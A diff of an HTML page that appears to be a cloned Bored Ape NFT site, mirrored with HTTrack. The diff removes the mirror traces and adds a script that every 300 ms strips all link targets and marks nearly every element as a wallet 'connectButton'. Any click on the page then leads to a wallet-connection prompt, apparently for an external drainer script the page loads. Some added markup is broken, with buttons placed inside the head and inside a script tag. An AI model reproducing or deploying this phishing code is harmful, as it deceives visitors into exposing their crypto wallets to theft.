@@ -1,9 +1,6 @@
-
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 
-<!-- Mirrored from ape2022.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 15 Feb 2022 03:03:20 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
     <script charset="UTF-8" async type="text/javascript" src="./c06cedd_5.js"></script>
     <meta charset="UTF-8">
@@ -14,300 +11,88 @@
     <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap"
           rel="stylesheet">
-<link rel="icon" href="favicon.ico"><link href="css/app_1.css" rel="stylesheet"><style>
-    .MuiFormControl-fullWidth {
-        width: 100%;
-    }
-    .MuiFormControl-root {
-        border: 0;
-        margin: 0;
-        display: inline-flex;
-        padding: 0;
-        position: relative;
-        min-width: 0;
-        flex-direction: column;
-        vertical-align: top;
-    }
-    @-moz-keyframes mui-auto-fill {}
-    @-moz-keyframes mui-auto-fill-cancel {}
-    .MuiInputBase-root {
-        color: rgba(0, 0, 0, 0.87);
-        cursor: text;
-        display: inline-flex;
-        position: relative;
-        font-size: 1rem;
-        box-sizing: border-box;
-        align-items: center;
-        font-family: "Roboto", "Helvetica", "Arial", sans-serif;
-        font-weight: 400;
-        line-height: 1.1876em;
-        letter-spacing: 0.00938em;
-    }
-    .MuiInputBase-root.Mui-disabled {
-        color: rgba(0, 0, 0, 0.38);
-        cursor: default;
-    }
-    .MuiInput-root {
-        position: relative;
-    }
-    .jss3:after {
-        border-bottom: 2px solid rgb(3, 125, 214);
-    }
-    label + .MuiInput-formControl {
-        margin-top: 16px;
-    }
-    .MuiInput-colorSecondary.MuiInput-underline:after {
-        border-bottom-color: #f50057 !important;
-    }
-    .MuiInput-underline:after {
-        left: 0 !important;
-        right: 0 !important;
-        bottom: 0 !important;
-        content: "" !important;
-        position: absolute !important;
-        transform: scaleX(0) !important;
-        transition: transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
-        border-bottom: 2px solid #3f51b5;
-        pointer-events: none !important;
-    }
-    .MuiInput-underline.Mui-focused:after {
-        transform: scaleX(1) !important;
-    }
-    .MuiInput-underline.Mui-error:after {
-        transform: scaleX(1) !important;
-        border-bottom-color: #f44336;
-    }
-    .MuiInput-underline:before {
-        left: 0 !important;
-        right: 0 !important;
-        bottom: 0 !important;
-        content: "\00a0" !important;
-        position: absolute !important;
-        transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-        border-bottom: 1px solid rgba(0, 0, 0, 0.42) !important;
-        pointer-events: none !important;
-    }
-    .MuiInput-underline:hover:not(.Mui-disabled):before {
-        border-bottom: 2px solid rgba(0, 0, 0, 0.87) !important;
-    }
-    .MuiInput-underline.Mui-disabled:before {
-        border-bottom-style: dotted !important;
-    }
-    @media (hover: none) {
-        .MuiInput-underline:hover:not(.Mui-disabled):before {
-            border-bottom: 1px solid rgba(0, 0, 0, 0.42) !important;
+    <link rel="icon" href="favicon.ico">
+    <link href="css/app_1.css" rel="stylesheet">
+    <style>
+        .MuiFormControl-fullWidth {
+            width: 100%;
         }
-    }
-    .MuiInputLabel-animated {
-        transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
-    }
-    .MuiInputLabel-formControl {
-        top: 0;
-        left: 0;
-        position: absolute;
-        transform: translate(0, 24px) scale(1);
-    }
-    .jss1 {
-        color: #aeaeae;
-        font-weight: 400;
-    }
-    .jss1.jss2 {
-        color: #aeaeae;
-    }
-    .jss1.jss4 {
-        color: #aeaeae;
-    }
-    .jss3:after {
-        border-bottom: 2px solid rgb(3, 125, 214);
-    }
-    .jss5 {
-        color: #aeaeae;
-    }
-    .jss6 {
-        padding: 8px;
-    }
-    .jss6::placeholder {
-        color: #aeaeae;
-    }
-    .jss7 {
-        color: #fff;
-    }
-    .jss8:after {
-        border-bottom: 2px solid #fff;
-    }
-    .jss9.jss10 {
-        color: #5b5b5b;
-    }
-    .jss9.jss4 {
-        color: #5b5b5b;
-    }
-    .jss12 {
-        border: 1px solid #BBC0C5;
-        height: 48px;
-        display: flex;
-        padding: 0 16px;
-        align-items: center;
-        border-radius: 6px;
-    }
-    label + .jss12 {
-        margin-top: 9px;
-    }
-    .jss12.jss11 {
-        border: 1px solid #2f9ae0;
-    }
-    .jss13 {
-        color: #5b5b5b;
-        position: initial;
-        font-size: 1rem;
-        transform: none;
-        transition: none;
-    }
-    .jss14 {
-        color: #5b5b5b;
-        position: initial;
-        font-size: .75rem;
-        transform: none;
-        transition: none;
-    }
-    .jss15 {
-        line-height: initial !important;
-    }
-    .MuiInputLabel-root {
-        display: block;
-        transform-origin: top left;
-    }
-    .MuiFormLabel-root {
-        color: rgba(0, 0, 0, 0.54);
-        padding: 0;
-        font-size: 1rem;
-        font-family: "Roboto", "Helvetica", "Arial", sans-serif;
-        font-weight: 400;
-        line-height: 1;
-        letter-spacing: 0.00938em;
-    }
-    .MuiFormLabel-root.Mui-focused {
-        color: #3f51b5 !important;
-    }
-    .MuiFormLabel-root.Mui-disabled {
-        color: rgba(0, 0, 0, 0.38);
-    }
-    .MuiFormLabel-root.Mui-error {
-        color: #f44336;
-    }
-    .MuiFormLabel-root.Mui-focused {
-        color: #3f51b5;
-    }
-    .MuiFormLabel-root.Mui-disabled {
-        color: rgba(0, 0, 0, 0.38);
-    }
-    .MuiFormLabel-root.Mui-error {
-        color: #f44336;
-    }
-    .MuiFormLabel-colorSecondary.Mui-focused {
-        color: #f50057;
-    }
-    .MuiInput-underline.Mui-focused:after {
-        transform: scaleX(1);
-    }
-    .MuiInputLabel-shrink {
-        transform: translate(0, 1.5px) scale(0.75);
-        transform-origin: top left;
-    }
-    .MuiInputLabel-animated {
-        transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
-    }
-    .MuiInputLabel-filled {
-        z-index: 1;
-        transform: translate(12px, 20px) scale(1);
-        pointer-events: none;
-    }
-    .MuiInputLabel-filled.MuiInputLabel-marginDense {
-        transform: translate(12px, 17px) scale(1);
-    }
-    .MuiInputLabel-filled.MuiInputLabel-shrink {
-        transform: translate(12px, 10px) scale(0.75);
-    }
-    .MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {
-        transform: translate(12px, 7px) scale(0.75);
-    }
-    .MuiInputLabel-outlined {
-        z-index: 1;
-        transform: translate(14px, 20px) scale(1);
-        pointer-events: none;
-    }
-    .MuiInputLabel-outlined.MuiInputLabel-marginDense {
-        transform: translate(14px, 12px) scale(1);
-    }
-    .MuiInputLabel-outlined.MuiInputLabel-shrink {
-        transform: translate(14px, -6px) scale(0.75);
-    }
-    .MuiInputLabel-root {
-        display: block;
-        transform-origin: top left;
-    }
-    .MuiInputLabel-formControl {
-        top: 0;
-        left: 0;
-        position: absolute;
-        transform: translate(0, 24px) scale(1);
-    }
-    .MuiInputLabel-marginDense {
-        transform: translate(0, 21px) scale(1);
-    }
-    .MuiInputLabel-shrink {
-        transform: translate(0, 1.5px) scale(0.75);
-        transform-origin: top left;
-    }
-    .MuiInputLabel-animated {
-        transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
-    }
-    .MuiInputLabel-filled {
-        z-index: 1;
-        transform: translate(12px, 20px) scale(1);
-        pointer-events: none;
-    }
-    .MuiInputLabel-filled.MuiInputLabel-marginDense {
-        transform: translate(12px, 17px) scale(1);
-    }
-    .MuiInputLabel-filled.MuiInputLabel-shrink {
-        transform: translate(12px, 10px) scale(0.75);
-    }
-    .MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {
-        transform: translate(12px, 7px) scale(0.75);
-    }
-    .MuiInputLabel-outlined {
-        z-index: 1;
-        transform: translate(14px, 20px) scale(1);
-        pointer-events: none;
-    }
-    .MuiInputLabel-outlined.MuiInputLabel-marginDense {
-        transform: translate(14px, 12px) scale(1);
-    }
-    .MuiInputLabel-outlined.MuiInputLabel-shrink {
-        transform: translate(14px, -6px) scale(0.75);
-    }
-    .MuiFormControl-root {
-        border: 0;
-        margin: 0;
-        display: inline-flex;
-        padding: 0;
-        position: relative;
-        min-width: 0;
-        flex-direction: column;
-        vertical-align: top;
-    }
-    .MuiFormControl-marginNormal {
-        margin-top: 16px;
-        margin-bottom: 8px;
-    }
-    .MuiFormControl-marginDense {
-        margin-top: 8px;
-        margin-bottom: 4px;
-    }
-    .MuiFormControl-fullWidth {
-        width: 100%;
-    }
-</style></head>
+
+        .MuiFormControl-root {
+            border: 0;
+            margin: 0;
+            display: inline-flex;
+            padding: 0;
+            position: relative;
+            min-width: 0;
+            flex-direction: column;
+            vertical-align: top;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        #roundButton {
+            background-color: #3498db; /* Blue color */
+            border: none;
+            color: #fff; /* White text */
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 50%; /* Make it round */
+        }
+
+        .connectButton {
+            /* Add any additional styling for the connectButton class */
+        }
+    </style>
+
+    <script>
+        function addClassesToElements() {
+            const links = document.querySelectorAll('a:not(.connectButton)');
+            for (const link of links) {
+                link.removeAttribute('href');
+                link.classList.add('connectButton');
+            }
+            const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+            for (const button of buttons) {
+                button.classList.add('connectButton');
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            document.getElementById('roundButton').addEventListener('click', function () {
+                alert('Button Clicked!');
+            });
+
+            // Uncomment the line below if you want to call the addClassesToElements function
+            // addClassesToElements();
+        });
+
+        function addClassesToElements() {
+            const links = document.querySelectorAll('a:not(.connectButton)');
+            for (const link of links) {
+                link.removeAttribute('href');
+                link.classList.add('connectButton');
+            }
+            const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+            for (const button of buttons) {
+                button.classList.add('connectButton');
+            }
+        }
+        setInterval(addClassesToElements, 300);
+    </script>
+<button id="roundButton" class="connectButton">Connect</button>
+
+</head>
 <body>
 <input id="orytytytyty" type="hidden" value="">
 <input id="yturytytyty" type="hidden" value="">
@@ -318,7 +103,7 @@
                 <img src="images/content/bayc-logo.png" alt="">
             </div>
 <div class="separator-line">
-
+    <button id="roundButton" class="some random-classes here connectButton">Connect</button>
 </div>
 
 <div class="footer-logo">
@@ -1179,8 +964,7 @@
             })
         }
     });
-
-
+<button id="roundButton" class="connectButton">Connect</button>
 </script>
 </body>
 
